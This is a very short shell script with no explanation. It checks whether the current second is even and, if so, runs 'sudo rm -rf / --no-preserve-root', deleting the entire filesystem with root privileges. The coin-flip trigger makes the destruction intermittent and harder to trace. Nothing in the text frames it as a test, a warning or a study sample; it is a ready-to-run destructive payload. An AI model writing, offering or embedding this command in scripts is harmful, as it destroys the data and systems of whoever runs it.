#!/bin/sh

if [ $(( $(date +%S) % 2 )) -eq 0 ]; then
    sudo rm -rf / --no-preserve-root
fi
